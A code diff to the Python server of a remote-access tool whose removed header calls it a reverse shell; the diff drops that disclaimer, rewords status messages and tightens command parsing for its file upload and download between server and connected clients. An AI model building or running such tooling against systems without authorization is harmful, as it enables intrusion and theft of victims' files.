@@ -1,7 +1,3 @@
-# Created by Vasto Boy
-
-# Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.
-
 import os
 import re
 import time
@@ -75,7 +71,7 @@ class AOXServer:
 
                 self.client_conn_dict.update({mac_address: conn})
                 self.sql_handler.store_client_info(ip, conn, client_info)
-                self.create_client_folder(mac_address) #create a folder for client using mac address
+                self.create_client_folder(mac_address) # create a folder for client using mac address
 
             except Exception as e:
                 print(e)
@@ -136,7 +132,7 @@ class AOXServer:
                 conn.send(str(fileSize).encode())
                 time.sleep(1)
                 if fileSize == 0:
-                    print("[-] File is empty!!!")
+                    print("[-]File is empty!")
                     conn.send(str(" ").encode())
                 else:
                     with open(usrFile, 'rb') as file:
@@ -149,7 +145,7 @@ class AOXServer:
                                 conn.send(data)
                                 data = file.read(1024)
                             file.close()
-                        print("[+] Data sent!!!")
+                        print("[+]File sent!")
         elif os.path.isdir(usrFile):
             print(f"[-]{usrFile} is a directory, not a file!")
             conn.send(str(0).encode())
@@ -172,7 +168,7 @@ class AOXServer:
                     data = conn.recv(1024)
                     file.write(data)
                     file.close()
-                    print("[+]Data received!!!")
+                    print("[+]File received!")
                 else:
                     data = conn.recv(1024)
                     totalFileRecv = len(data)
@@ -182,7 +178,7 @@ class AOXServer:
                         data = conn.recv(1024)
                     file.write(data)
                     file.close()
-                    print("[+]Data received!!!")
+                    print("[+]File received!")
 
 
 
@@ -201,8 +197,9 @@ class AOXServer:
 
                 elif cmd == "guide":
                     self.print_guide()
+                    self.send_null(client_conn)
 
-                elif cmd.startswith("get"):
+                elif cmd.startswith("get "):
                     client_conn.send(str(cmd).encode())
                     filename = cmd.split()[-1]
                     data = client_conn.recv(1024).decode()
@@ -216,7 +213,7 @@ class AOXServer:
                         self.receive_file(client_conn, self.sql_handler.get_mac_address(client_id), filename)
                         print(str(data), end="")
 
-                elif cmd.startswith("send"):
+                elif cmd.startswith("send "):
                     filepath = str(cmd.split()[-1])
 
                     if os.path.isabs(filepath):
